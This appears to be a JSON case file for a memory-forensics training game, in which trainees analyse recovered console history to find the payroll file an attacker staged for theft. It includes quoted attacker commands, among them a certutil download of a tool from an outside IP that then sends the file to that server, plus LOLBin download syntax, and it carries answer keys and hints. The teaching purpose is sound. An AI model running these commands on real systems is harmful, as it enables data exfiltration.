@@ -1,0 +1,71 @@
+{
+  "id": "case10",
+  "title": "Ghost Commands",
+  "stage": "stage2",
+  "difficulty": 3,
+  "xp_base": 150,
+  "tools_type": "mem_analyzer",
+  "scenario": "The attacker gained an interactive command shell on the victim system and executed commands to identify and steal sensitive data. Volatility has recovered the console history from memory, preserving the attacker's command trail even though the cmd.exe session is long closed. Analyze the recovered commands to determine what sensitive file the attacker staged for exfiltration.",
+  "challenge": "What file did the attacker stage for exfiltration?",
+  "challenge_data": "$ python3 vol.py -f meridian-wkstn047.mem windows.cmdline\nVolatility 3 Framework 2.7.0\n\nPID    Process          Args\n6284   cmd.exe          C:\\Windows\\system32\\cmd.exe\n6288   conhost.exe      \\??\\C:\\Windows\\system32\\conhost.exe 0x4\n\n$ python3 vol.py -f meridian-wkstn047.mem windows.consoles\nVolatility 3 Framework 2.7.0\n\nProcess: cmd.exe (PID 6284)\nConsole Host: conhost.exe (PID 6288)\nInput History Entries: 11\n\n--- Recovered Command History ---\n\nC:\\Windows\\system32>whoami\nMERIDIAN\\svc_backup\n\nC:\\Windows\\system32>net localgroup administrators\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n-------------------------------------------------------------------------------\nAdministrator\nDomain Admins\nsvc_backup\nThe command completed successfully.\n\nC:\\Windows\\system32>ipconfig /all\n[output truncated]\n\nC:\\Windows\\system32>cd C:\\Users\\Administrator\\Documents\n\nC:\\Users\\Administrator\\Documents>dir /s /b *.xlsx *.pdf *payroll* *salary* *confidential*\nC:\\Users\\Administrator\\Documents\\Finance\\payroll_2026_Q1.xlsx\nC:\\Users\\Administrator\\Documents\\Finance\\salary_bands_confidential.pdf\nC:\\Users\\Administrator\\Documents\\Finance\\employee_records.xlsx\nC:\\Users\\Administrator\\Documents\\Legal\\NDA_template_2026.pdf\nC:\\Users\\Administrator\\Documents\\Legal\\contracts_Q1_2026.pdf\n\nC:\\Users\\Administrator\\Documents>copy \"Finance\\payroll_2026_Q1.xlsx\" C:\\Windows\\Temp\\update.dat\n        1 file(s) copied.\n\nC:\\Users\\Administrator\\Documents>certutil -urlcache -split -f http://185.220.101.47/upload.php C:\\Windows\\Temp\\up.exe\nCertUtil: -URLCache command completed successfully.\n\nC:\\Users\\Administrator\\Documents>C:\\Windows\\Temp\\up.exe --file C:\\Windows\\Temp\\update.dat --server 185.220.101.47\n[Exfiltration utility launched]",
+  "valid_answers": ["payroll_2026_q1.xlsx", "payroll_2026_q1", "payroll 2026 q1 xlsx", "payroll 2026 q1.xlsx", "the payroll file", "payroll spreadsheet", "payroll_2026_Q1.xlsx", "Finance\\payroll_2026_Q1.xlsx"],
+  "steps": [
+    {
+      "question": "What account was the attacker operating as when these commands were run?",
+      "valid_answers": ["svc_backup", "meridian\\svc_backup", "svc_backup account", "the svc_backup account"],
+      "hints": [
+        "The first command in the recovered history is 'whoami'. Look at the output line directly below it.",
+        "The whoami output reads 'MERIDIAN\\svc_backup' — this is the domain and username of the account running the commands.",
+        "svc_backup is a service account, which is suspicious for interactive command-line activity. The net localgroup output confirms it is also in the Administrators group.",
+        "The account is MERIDIAN\\svc_backup. This service account has full administrative privileges, as confirmed by both the whoami output and the net localgroup administrators output showing it as a member."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "administrator", "response": "Administrator appears in the net localgroup output as a member, but the whoami result shows the active session account is svc_backup."},
+        {"pattern": "j.park", "response": "j.park is the user whose workstation this is, but the whoami output shows the attacker is operating as svc_backup — a different account."}
+      ]
+    },
+    {
+      "question": "What command did the attacker use to download the exfiltration tool, and what Windows built-in binary ran it?",
+      "valid_answers": ["certutil", "certutil -urlcache", "certutil urlcache", "certutil -urlcache -split -f", "certutil download"],
+      "hints": [
+        "Look through the command history for a command that downloads a file from an external URL. It is a built-in Windows tool, not a third-party download manager.",
+        "The command downloads a file from http://185.220.101.47/upload.php and saves it as C:\\Windows\\Temp\\up.exe. What tool executes this with the -urlcache flag?",
+        "certutil is a legitimate Windows certificate utility (part of Certificate Services) that can also download files from the internet using the -urlcache flag — making it a LOLBin (Living Off the Land Binary).",
+        "The command is: certutil -urlcache -split -f http://185.220.101.47/upload.php C:\\Windows\\Temp\\up.exe. certutil is the Windows built-in LOLBin used here to download the exfiltration tool."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "powershell", "response": "PowerShell is not shown in this command history. The download uses a different Windows built-in utility — look for the certutil command."},
+        {"pattern": "curl", "response": "curl is not used here. The attacker used a native Windows certificate tool that doubles as a file downloader."}
+      ]
+    },
+    {
+      "question": "What file did the attacker stage for exfiltration?",
+      "valid_answers": ["payroll_2026_q1.xlsx", "payroll_2026_q1", "payroll 2026 q1 xlsx", "payroll 2026 q1.xlsx", "the payroll file", "payroll spreadsheet", "payroll_2026_Q1.xlsx", "Finance\\payroll_2026_Q1.xlsx"],
+      "hints": [
+        "The recovered command history shows everything the attacker typed. Look for a command that copies or stages a specific file — this would typically be a 'copy' command.",
+        "There is a 'copy' command in the history. Look at what file was copied and where it was copied to. The source file is what was targeted for exfiltration.",
+        "The command 'copy \"Finance\\payroll_2026_Q1.xlsx\" C:\\Windows\\Temp\\update.dat' copies the payroll file to the Temp directory disguised as 'update.dat'. This is the staging step before exfiltration.",
+        "The attacker used 'copy' to move payroll_2026_Q1.xlsx to C:\\Windows\\Temp\\update.dat as a staging step, then downloaded an exfiltration tool (up.exe) using certutil. The staged/targeted file is payroll_2026_Q1.xlsx."
+      ],
+      "wrong_answer_hints": [
+        {"pattern": "update.dat", "response": "update.dat is the disguised name the attacker gave the file after copying it — the original source file that was targeted is what the question asks for."},
+        {"pattern": "salary", "response": "salary_bands_confidential.pdf appeared in the dir listing, but the attacker's copy command targeted a different file — look at the copy command's source argument."},
+        {"pattern": "employee", "response": "employee_records.xlsx appeared in the dir listing, but only one file was actually copied and staged. Look at which filename appears in the copy command."}
+      ]
+    }
+  ],
+  "hints": [
+    "The recovered command history shows everything the attacker typed. Look for a command that copies or stages a specific file — this would typically be a 'copy' command.",
+    "There is a 'copy' command in the history. Look at what file was copied and where it was copied to. The source file is what was targeted for exfiltration.",
+    "The command 'copy \"Finance\\payroll_2026_Q1.xlsx\" C:\\Windows\\Temp\\update.dat' copies the payroll file to the Temp directory disguised as 'update.dat'. This is the staging step before exfiltration.",
+    "The attacker used 'copy' to move payroll_2026_Q1.xlsx to C:\\Windows\\Temp\\update.dat as a staging step, then downloaded an exfiltration tool (up.exe) using certutil. The staged/targeted file is payroll_2026_Q1.xlsx."
+  ],
+  "learn": "Windows console history is stored in memory by the Console Host process (conhost.exe) and is recoverable from memory dumps even after the cmd.exe session is closed. This makes memory forensics invaluable for reconstructing attacker activity when traditional log sources are unavailable or have been cleared.\n\nVolatility plugins for command history:\n- windows.cmdline: Shows the command line arguments for each process (how processes were launched)\n- windows.consoles: Recovers the actual interactive console history — the commands typed and output received\n- cmdscan: Older Volatility2 plugin for console scanning (still referenced in cert exams)\n\nKey attacker actions observed in this case:\n1. whoami — Confirms current user context (svc_backup with admin rights)\n2. net localgroup administrators — Confirms svc_backup is in the Administrators group (privilege verification)\n3. dir /s /b — Recursive directory listing looking for sensitive files (data discovery, T1083)\n4. copy to Temp — Staging the target file in a writable location before exfil (T1074 - Data Staged)\n5. certutil download — Downloads an exfiltration utility using a built-in Windows tool (LOLBin)\n6. up.exe execution — The custom exfiltration tool transmits the staged file\n\ncertutil is a LOLBin (Living Off the Land Binary) — a legitimate Windows system tool abused for malicious purposes:\n- certutil -urlcache -split -f [URL] [output] — Downloads files from the internet\n- certutil -encode file.exe file.b64 — Base64 encodes files (for exfil evasion)\n- certutil -decode file.b64 file.exe — Decodes Base64 files\n\nOther common LOLBins:\n- mshta.exe — Executes HTML applications (malicious HTA files)\n- wscript.exe / cscript.exe — Execute VBScript and JScript\n- rundll32.exe — Loads DLL functions (used to execute malicious DLLs)\n- regsvr32.exe — Register/execute COM servers (used in Squiblydoo attack)\n- bitsadmin.exe — Background Intelligent Transfer Service (file downloads)\n- powershell -enc — Executes Base64-encoded PowerShell commands\n\nForensic value: Recovered console history establishes a precise timeline of attacker actions, proves intent, and identifies targeted data — all critical for both incident response and legal proceedings.",
+  "debrief": {
+    "summary": "The recovered console history shows the attacker, operating as svc_backup (an administrator account), discovered finance documents and staged payroll_2026_Q1.xlsx as C:\\Windows\\Temp\\update.dat. They then used certutil — a legitimate Windows built-in LOLBin — to download a custom exfiltration tool and upload the payroll data to the C2 server.",
+    "real_world": "Recovered console history from memory is among the most powerful evidence in incident response — it shows exactly what an attacker typed, in order, with timestamps derivable from surrounding memory artifacts. This is especially valuable when Windows PowerShell logging and command history files have been cleared.",
+    "next_step": "Check perimeter firewall and proxy logs for successful HTTP POST connections to 185.220.101.47 to determine if the exfiltration of the payroll file completed, and initiate breach notification assessment if confirmed.",
+    "cert_link": "CySA+ CS0-003 Domain 4 (Security Operations), GCFA",
+    "exam_tip": "certutil -urlcache is a LOLBin used for downloading files from the internet. Know the common LOLBins for exams: certutil, mshta, wscript, rundll32, regsvr32, bitsadmin. Living Off the Land means attackers use legitimate OS tools to avoid detection by AV and EDR solutions."
+  }
+}
